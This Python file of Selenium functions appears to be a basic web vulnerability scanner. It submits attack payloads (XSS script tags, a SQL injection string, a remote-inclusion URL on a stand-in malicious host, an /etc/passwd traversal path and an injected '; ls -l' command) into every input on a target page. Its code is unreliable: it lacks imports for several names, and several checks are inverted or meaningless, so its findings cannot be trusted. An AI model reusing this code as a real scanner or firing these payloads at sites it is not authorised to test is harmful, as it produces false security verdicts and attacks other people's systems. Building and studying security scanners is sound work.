from selenium.common.exceptions import NoSuchElementException
import re

def scan_xss(driver, url):
    xss_payload = "<script>alert('XSS')</script>"
    try:
        inputs = driver.find_elements(By.TAG_NAME, 'input')
        for input_element in inputs:
            input_element.send_keys(xss_payload)
            input_element.send_keys(Keys.RETURN)
        time.sleep(2)
        if xss_payload in driver.page_source:
            return "Vulnerable to XSS"
        return "Not vulnerable to XSS"
    except Exception as e:
        return f"Error scanning for XSS: {e}"

def scan_sqli(driver, url):
    sqli_payload = "' OR '1'='1"
    try:
        inputs = driver.find_elements(By.TAG_NAME, 'input')
        for input_element in inputs:
            input_element.send_keys(sqli_payload)
            input_element.send_keys(Keys.RETURN)
        time.sleep(2)
        if "syntax error" in driver.page_source.lower():
            return "Vulnerable to SQL Injection"
        return "Not vulnerable to SQL Injection"
    except Exception as e:
        return f"Error scanning for SQL Injection: {e}"

def scan_csrf(driver, url):
    try:
        forms = driver.find_elements(By.TAG_NAME, 'form')
        for form in forms:
            if 'csrf' not in form.get_attribute('innerHTML').lower():
                return "Vulnerable to CSRF"
        return "Not vulnerable to CSRF"
    except Exception as e:
        return f"Error scanning for CSRF: {e}"

def scan_open_redirect(driver, url):
    open_redirect_payload = "http://evil.com"
    try:
        links = driver.find_elements(By.TAG_NAME, 'a')
        for link in links:
            href = link.get_attribute('href')
            if href and open_redirect_payload in href:
                return "Vulnerable to Open Redirect"
        return "Not vulnerable to Open Redirect"
    except Exception as e:
        return f"Error scanning for Open Redirect: {e}"

def scan_rfi(driver, url):
    rfi_payload = "http://malicious.com/malicious.txt"
    try:
        inputs = driver.find_elements(By.TAG_NAME, 'input')
        for input_element in inputs:
            input_element.send_keys(rfi_payload)
            input_element.send_keys(Keys.RETURN)
        time.sleep(2)
        if "malicious.txt" in driver.page_source:
            return "Vulnerable to RFI"
        return "Not vulnerable to RFI"
    except Exception as e:
        return f"Error scanning for RFI: {e}"

def scan_lfi(driver, url):
    lfi_payload = "../../../../../../../etc/passwd"
    try:
        inputs = driver.find_elements(By.TAG_NAME, 'input')
        for input_element in inputs:
            input_element.send_keys(lfi_payload)
            input_element.send_keys(Keys.RETURN)
        time.sleep(2)
        if "/etc/passwd" in driver.page_source:
            return "Vulnerable to LFI"
        return "Not vulnerable to LFI"
    except Exception as e:
        return f"Error scanning for LFI: {e}"

def scan_command_injection(driver, url):
    command_payload = "; ls -l"
    try:
        inputs = driver.find_elements(By.TAG_NAME, 'input')
        for input_element in inputs:
            input_element.send_keys(command_payload)
            input_element.send_keys(Keys.RETURN)
        time.sleep(2)
        if "permission denied" not in driver.page_source.lower():
            return "Vulnerable to Command Injection"
        return "Not vulnerable to Command Injection"
    except Exception as e:
        return f"Error scanning for Command Injection: {e}"

def scan_unauth_access(driver, url):
    try:
        response = driver.page_source
        if re.search(r'Authorization Required|Unauthorized', response):
            return "Vulnerable to Unauthorized Access"
        return "Not vulnerable to Unauthorized Access"
    except Exception as e:
        return f"Error scanning for Unauthorized Access: {e}"
